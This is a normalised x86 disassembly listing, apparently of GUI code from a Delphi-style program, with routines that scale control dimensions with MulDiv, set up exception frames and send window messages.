mov edx [ eax + 0xc ]
add edx esi
call sub_3ac4ec8
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_3aaf4fc
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_3aaf540
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x254 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_3ac4ec8
jmp r-xdata
mov esi [ ebx + 0x250 ]
mov eax ebx
call sub_3aaf4fc
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_3ac4ec8
mov eax ebx
call sub_3aaf4fc
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_3aaf540
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x254 ]
mov eax ebx
call sub_3aaf540
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_3ac4ec8
mov eax ebx
call sub_3aaf540
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_3ac57ac
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x250 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x254 ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_3ac4ec8
xor edx edx
mov eax [ ebx + 0x254 ]
call sub_3ac4ec8
cmp [ ebx + 0x258 ] 0x0
jne r-xdata
mov eax [ ebx + 0x250 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x254 ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x250 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x254 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_3ac5018
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_3ac5018
sub_3ac5850
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ac57ac
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ab7738
pop edi
pop esi
pop ebx
retn
sub_3ac5878
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x25c ]
xor edx edx
push ebp
push sub_3ac58e4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab608c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac58eb
mov eax [ ebp - 0x4 ]
dec [ eax + 0x25c ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_3ac58eb
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x260 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x1
xor eax eax
push ebp
push sub_3ac5933
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3ac54c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac593a
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x260 ] dl
retn
sub_3ac593a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ac5548
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ac59b0
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_3aaf4fc
mov edx [ ebx + 0x250 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jge r-xdata
mov esi eax
mov esi edx
jmp r-xdata
mov edi edx
mov edi eax
jmp r-xdata
mov eax ebx
call sub_3aaf540
mov edx [ ebx + 0x254 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jle r-xdata
push edi
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x254 ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ ebx + 0x250 ]
mov eax [ eax + 0xc ]
neg eax
mov ecx esi
call sub_3a78e44
mov eax [ esp ]
lea esi [ esp + 0x4 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov eax ebx
call sub_3ab2d60
add esp 0x14
pop edi
pop esi
pop ebx
retn
sub_3ac5a30
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ac5a91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab6f84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac5a98
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_3ac5ac0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ac526c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov dl 0x1
mov eax esi
call sub_3ac54ec
mov edx 0xb9
mov eax esi
call sub_3aaf278
mov edx 0x29
mov eax esi
call sub_3aaf2ac
mov [ esi + 0x268 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac5b2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ac5320
movzx eax [ ebx + 0x268 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_3ac5b98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab7220
pop esi
pop ebx
retn
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
mov eax ebx
call sub_3ab4518
sub_3ac5bc8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3ac5d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_3ac5d0c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp - 0x4 ]
call sub_3a64258
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac5d13
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x358 ] 0x1
xor eax eax
push ebp
push sub_3ac5cd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_3a7a0c4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x358 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a64260
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
sub_3ac5d54
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
test [ ebx + 0x358 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_3a6457c
and [ ebx + 0x358 ] 0xdf
sub_3ac5d8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0xc
call sub_3a62ec8
mov [ ebx + 0x2a4 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_3ac526c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_3acc104
xor edx edx
mov eax ebx
call sub_3acc140
mov edx 0x140
mov eax ebx
call sub_3aaf278
mov edx 0xf0
mov eax ebx
call sub_3aaf2ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8fc88
mov esi eax
mov [ ebx + 0x288 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x288 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_3ac6a3c
mov [ ebx + 0x278 ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov esi eax
mov [ ebx + 0x280 ] esi
mov eax esi
mov edx ebx
call sub_3aae42c
movzx eax [ r-xdata ]
mov [ ebx + 0x270 ] al
mov [ ebx + 0x271 ] 0x2
mov [ ebx + 0x273 ] 0x0
mov [ ebx + 0x279 ] 0x3
mov [ ebx + 0x28c ] 0x0
mov eax [ ebx + 0x2a4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
mov [ eax ] edx
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ad0f9c
mov edx [ ebx + 0x2a4 ]
mov [ edx + 0x4 ] eax
mov eax ebx
call sub_3ad0d70
mov [ eax + 0x24 ] ebx
mov [ eax + 0x20 ] sub_3ad0e24
mov eax [ ebx + 0x2a4 ]
mov [ eax + 0x8 ] 0x0
mov [ ebx + 0x27d ] 0x1
mov eax ebx
call sub_3a64258
mov [ ebx + 0xac ] eax
mov [ ebx + 0x329 ] 0xff
xor eax eax
mov [ ebx + 0x354 ] eax
xor edx edx
mov eax ebx
call sub_3ac6dc0
xor edx edx
mov eax ebx
call sub_3aafd7c
xor edx edx
mov eax ebx
call sub_3aafcb4
mov dl 0x1
mov eax ebx
call sub_3ab7e14
mov edx ebx
mov eax [ rw-data ]
call sub_3acc9c8
mov [ ebx + 0x34c ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac5f55
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_3a83918
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_3a7a630
xor edx edx
mov eax ebx
call sub_3a7dcac
cmp [ ebx + 0x2ac ] 0x0
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
mov eax [ ebx + 0x2ac ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
mov eax ebx
call sub_3acb6a4
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_3ac5fc0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_3a6478c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3ace00c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_3ac60c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ac9ab4
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3acca00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
add eax 0x32c
call sub_3a6efbc
mov eax [ ebp - 0x4 ]
add eax 0x338
call sub_3a6efbc
mov eax [ ebp - 0x4 ]
call sub_3ad0d70
call sub_3a64380
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
call sub_3a62efc
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_3ac52e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac60c7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb4 ]
sub_3ac60dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x31a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_3ac611d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac6dc0
sub_3ac6122
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_3a6457c
test al al
jne r-xdata
call sub_3a64cb0
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x2
je r-xdata
call sub_3a64c5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac6dc0
sub_3ac6158
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x322 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_3ac6199
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3ac61b8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_3ab2324
cmp [ ebx + 0x268 ] 0x0
je r-xdata
mov eax ebx
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_3ad0e24
mov edi [ ebx + 0x268 ]
xor eax eax
mov [ ebx + 0x268 ] eax
mov eax edi
mov si 0xffb6
call sub_3a6457c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax ebx
call sub_3ac95b4
sub_3ac621c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab3c04
mov eax ebx
sub al 0x1
jb r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
je r-xdata
cmp [ edi + 0x298 ] 0x0
je r-xdata
cmp [ edi + 0x290 ] 0x0
jne r-xdata
cmp esi [ edi + 0x290 ]
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x298 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x2a0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_3ac8260
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp esi [ edi + 0x2a8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_3ac8238
mov edx esi
mov eax edi
call sub_3ac8260
jmp r-xdata
cmp esi [ edi + 0x334 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_3ac8214
mov eax [ edi + 0x32c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_3ac859c
mov eax [ edi + 0x338 ]
test eax eax
je r-xdata
mov edx esi
call sub_3a7a4f0
test eax eax
jl r-xdata
cmp esi [ edi + 0x340 ]
jne r-xdata
mov edx esi
call sub_3a7a4f0
test eax eax
jl r-xdata
mov edx eax
mov eax [ edi + 0x32c ]
call sub_3a7a388
mov edx edi
mov eax esi
call sub_3a83978
cmp esi [ edi + 0x2c4 ]
jne r-xdata
xor eax eax
mov [ edi + 0x340 ] eax
mov edx eax
mov eax [ edi + 0x338 ]
call sub_3a7a388
mov edx edi
mov eax esi
call sub_3a83978
xor eax eax
mov [ edi + 0x2c4 ] eax
sub_3ac6358
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor ecx ecx
push ebp
push sub_3ac65d5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b0 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b4 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b8 ] edx
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_3a6430c
cmp eax [ r-xdata ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ab2ce8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov eax [ eax ]
test eax eax
je r-xdata
movzx eax [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x27c ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2b8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3aaf514
mov edx [ ebp - 0x4 ]
test [ edx + 0x8c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
mov [ eax + 0x8c ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3aaf558
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_3ac698c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp esi eax
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac65dc
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac57ac
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab76f0
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ac57ac
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2b8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3aaf63c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2b8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3ab76f0
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_3a894c0
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_3a894c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b0 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x242 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x242 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x246 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x246 ] eax
sub_3ac65e8
push ebp
mov ebp esp
and eax 0x7f
cmp eax 0x5
ja r-xdata
xor eax eax
pop ebp
retn
jmp [ eax * 4 + jump_table_3ac65fe ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad0d70
cmp [ eax + 0xc ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad0d70
cmp [ eax + 0x10 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad0d70
cmp [ eax + 0x14 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad0d70
cmp [ eax + 0x18 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad0d70
movzx eax [ eax + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ad0d70
movzx eax [ eax + 0x28 ]
pop ebp
retn
sub_3ac668c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov edx ebx
mov eax [ esi ]
call sub_3ab41ec
push 0x0
push 0x0
mov eax [ esi ]
push eax
push sub_3ac6934
mov eax [ esi ]
movzx ecx [ eax + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ac6900
mov eax [ esi ]
push eax
push sub_3ac6918
mov eax [ esi ]
movzx ecx [ eax + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ad0d7c
mov eax [ esi ]
push eax
push sub_3ad0ef4
push ebp
mov al 0x3
call sub_3ac65e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ad0d98
mov eax [ esi ]
push eax
push sub_3ad0f10
push ebp
mov al 0x4
call sub_3ac65e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ad0db4
mov eax [ esi ]
push eax
push sub_3ad0f2c
push ebp
xor eax eax
call sub_3ac65e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ad0dd0
mov eax [ esi ]
push eax
push sub_3ad0f48
push ebp
mov al 0x2
call sub_3ac65e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ad0dec
mov eax [ esi ]
push eax
push sub_3ad0f64
push ebp
mov al 0x5
call sub_3ac65e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_3ad0e08
mov eax [ esi ]
push eax
push sub_3ad0f80
push ebp
mov al 0x1
call sub_3ac65e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3ac68df
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7e46c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_3aafcb4
sub_3ac69a7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ac57ac
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ab76f0
mov eax ebx
call sub_3ac6a98
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_3a8956c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_3a89588
mov ecx edi
mov edx esi
mov eax ebx
call sub_3aaf63c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aaf540
mov ebp eax
push edi
push esi
mov eax ebx
call sub_3aaf4fc
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_3ac6d58
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_3ac6d8c
sub_3ac6a3c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax ebx
call sub_3ac9c28
push eax
push 0x1
push 0x80
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3ac6ad0
push ebx
mov ebx eax
mov eax ebx
call sub_3ac7ff4
test al al
je r-xdata
xor eax eax
pop ebx
retn
movzx eax [ ebx + 0x271 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
